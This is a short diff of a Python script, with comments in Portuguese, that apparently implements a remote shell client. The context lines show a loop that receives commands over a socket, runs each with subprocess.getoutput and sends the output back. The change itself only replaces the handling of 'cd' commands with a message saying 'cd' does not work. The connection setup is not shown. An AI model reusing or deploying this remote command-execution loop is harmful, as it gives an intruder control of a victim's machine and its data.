@@ -21,9 +21,7 @@ while True:
     if command.lower() == "exit":
         break
     if command.lower().startswith("cd"):
-        subprocess.getoutput(command)
-        output = subprocess.getoutput("cd")
-        s.send(output.encode())
+        s.send("Não use 'cd', não funciona!".encode())
     # Executar o comando
     output = subprocess.getoutput(command)
     # Enviar o resultado
